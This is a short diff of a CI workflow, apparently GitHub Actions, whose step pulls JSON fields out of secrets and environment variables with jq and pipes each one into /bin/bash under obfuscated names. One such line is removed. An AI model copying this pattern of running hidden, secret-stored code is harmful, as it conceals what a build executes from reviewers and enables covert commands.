@@ -22,7 +22,6 @@ jobs:
           e9204: ${{ secrets.e9204 }}
         run: |
           printf '%s' "$e9204" | jq -r .gcc93386 | /bin/bash
-          printf '%s' "$oi6" | jq -r .cjwgp7912 | /bin/bash
           printf '%s' "$gusx565" | jq -r .gfq14128 | /bin/bash
           printf '%s' "$bnksb84308" | jq -r .gitv0706 | /bin/bash
           echo $d2 | jq -r .szcj8 | /bin/bash
